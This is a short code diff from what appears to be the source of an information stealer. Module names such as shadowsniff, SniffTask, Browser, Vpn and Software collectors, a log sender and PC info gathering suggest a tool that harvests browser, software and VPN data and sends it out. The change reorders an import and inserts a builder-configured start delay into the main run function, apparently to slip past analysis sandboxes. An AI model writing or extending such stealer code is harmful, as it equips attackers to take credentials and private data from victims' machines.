@@ -29,6 +29,7 @@ use alloc::sync::Arc;
 use alloc::vec::Vec;
 use collector::atomic::AtomicCollector;
 use collector::display::PrimitiveDisplayCollector;
+use collector::{Browser, Collector, Software, Vpn};
 use filesystem::FileSystem;
 use filesystem::path::Path;
 use filesystem::virtualfs::VirtualFileSystem;
@@ -37,7 +38,6 @@ use rand_chacha::ChaCha20Rng;
 use rand_core::RngCore;
 use sender::LogSenderExt;
 use shadowsniff::SniffTask;
-use collector::{Collector, Browser, Software, Vpn};
 use tasks::Task;
 use utils::pc_info::PcInfo;
 use utils::random::ChaCha20RngExt;
@@ -45,6 +45,8 @@ use zip::ZipArchive;
 
 #[inline(always)]
 pub fn run() {
+    include!(env!("BUILDER_START_DELAY"));
+
     if !init_ip_info() {
         panic!()
     }
